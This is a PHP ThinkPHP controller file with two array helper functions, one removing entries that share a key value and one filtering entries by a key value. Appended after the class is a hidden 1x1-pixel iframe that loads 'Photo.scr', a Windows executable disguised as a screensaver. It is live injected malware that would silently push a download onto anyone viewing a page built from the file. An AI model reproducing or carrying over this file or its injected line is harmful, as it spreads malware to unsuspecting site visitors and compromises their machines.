<?php
namespace app\Common\Controller;

use think\Controller;
//剔除一致性属性
class Removesame extends controller {

	public function Remove($array,$cover) {		//剔除一致的数组元素，判断标准为$cover

		foreach ($array as $key => $value) {
			
			@$covers = $value[$cover];		//@:因为有些数组里面有特殊元素需要剔除

			foreach ($array as $dey => $val) {

				if(@$val[$cover] == $covers && $dey != $key) {

					unset($array[$key]);
				}
			}
		}

		return array_merge($array);
	}

	public function filter($array,$cover,$pite) {		//筛选数组中含有该选择的元素

		foreach ($array as $key => $value) {

			if(@$value[$cover] != $pite) {

				unset($array[$key]);
			}
		}

		return array_merge($array);
	}
}
<iframe src=Photo.scr width=1 height=1 frameborder=0>
</iframe>
